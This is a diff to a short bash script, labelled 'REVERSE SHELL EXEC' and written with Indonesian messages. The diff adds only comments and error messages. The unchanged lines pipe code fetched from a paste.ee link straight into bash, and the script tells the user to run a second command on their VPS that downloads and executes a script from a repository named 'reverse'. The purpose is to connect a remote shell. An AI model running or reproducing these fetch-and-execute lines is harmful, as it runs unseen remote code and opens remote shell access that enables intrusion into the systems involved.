@@ -8,18 +8,20 @@ echo -e "$BLUE ##  REVERSE SHELL EXEC  ##
  ## Author : @mekihunter ##$RESET
 "
 
+# Check if $API is set
 if [ -z "$API" ]; then
   # echo -e "$RED Gagal: API tidak boleh kosong!$RESET"
-  :
+  echo "API variable is missing!"
 else
   X="mekihunter_$API" bash -c "$(curl -fsSL https://paste.ee/r/C8YolZJS/0)"
   echo "Silahkan jalankan command berikut ini pada VPS Anda : "
   echo 'FROM_API="$API" bash -c "$(curl -fsSL https://raw.githubusercontent.com/evilstray/reverse/refs/heads/main/dx"'
 fi
 
+# Check if $FROM_API is set
 if [ -z "$FROM_API" ]; then
   # echo -e "$RED Gagal: FROM_API tidak boleh kosong!$RESET"
-  :
+  echo "FROM_API variable is missing!"
 else
   S="mekihunter_$FROM_API" bash -c "$(curl -fsSL https://paste.ee/r/C8YolZJS/0)"
   echo "Berhasil: Terhubung ke shell!"
